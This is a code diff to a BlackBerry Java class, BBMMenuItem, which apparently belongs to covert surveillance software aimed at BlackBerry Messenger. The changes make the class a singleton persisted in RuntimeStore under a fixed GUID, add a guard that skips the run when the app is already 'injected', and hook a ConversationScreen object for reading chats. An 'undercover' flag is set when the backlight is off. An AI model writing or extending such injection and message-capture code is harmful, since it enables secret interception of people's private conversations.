@@ -6,6 +6,7 @@ import java.util.Vector;
 import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
 import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
 import net.rim.device.api.system.Backlight;
+import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
@@ -19,7 +20,6 @@ public class BBMMenuItem extends ApplicationMenuItem {
 	//#ifdef DEBUG
 	private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
 	// #endif
-	private static BBMMenuItem instance;
 
 	UiApplication bbmApplication;
 	Screen contactsScreen;
@@ -33,19 +33,37 @@ public class BBMMenuItem extends ApplicationMenuItem {
 	// int numContacts;
 	// int numEmails;
 
-	public static BBMMenuItem getInstance() {
-		if (instance == null)
-			instance = new BBMMenuItem(20);
+	private static BBMMenuItem instance;
+    private static final long GUID = 0x25fbb0c55be3907fL;
 
-		return instance;
-	}
+    public static synchronized BBMMenuItem getInstance() {
+        if (instance == null) {
+            instance = (BBMMenuItem) RuntimeStore.getRuntimeStore().get(GUID);
+            if (instance == null) {
+                final BBMMenuItem singleton = new BBMMenuItem(20);
+
+                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                instance = singleton;
+            }
+        }
+        return instance;
+    }
+
 
 	public BBMMenuItem(int arg0) {
 		super(arg0);
 
 		undercover = !Backlight.isEnabled();
-		lookForConversationsThread();
+		conversationScreen = new ConversationScreen();
+		//lookForConversationsThread();
 
+	}
+	
+	public void checkForConversationScreen(){
+	    //#ifdef DEBUG
+        debug.trace("checkForConversationScreen");
+        //#endif
+	    conversationScreen.getConversationScreen();
 	}
 
 	Vector contacts = new Vector();
@@ -69,8 +87,16 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
 	}
 
-	public Object run(Object context) {
+	public synchronized Object run(Object context) {
 		try {
+		    
+		    if(bbmInjected){
+		        //#ifdef DEBUG
+                debug.trace("run: already injected");
+                //#endif
+                return null;
+		    }
+		    
 		    debug.init();
 			debug.info("BBMMenuItem context: " + context);
 			UiApplication app = UiApplication.getUiApplication();
